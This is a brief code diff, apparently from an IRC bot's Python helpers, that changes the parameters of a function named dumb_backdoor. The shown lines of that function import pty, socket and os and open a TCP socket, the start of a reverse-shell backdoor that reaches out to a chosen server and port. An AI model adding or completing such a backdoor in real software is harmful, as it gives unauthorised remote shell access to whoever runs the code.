@@ -24,7 +24,7 @@ def print_exception(nick, lines):
 def dprint(channel, msg):
 	if config.debug: config.irc.privmsg(channel, "[DEBUG] " + msg)
 
-def dumb_backdoor(irc, nick, server, port):
+def dumb_backdoor(nick, server, port):
 	import pty, socket, os
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	try:
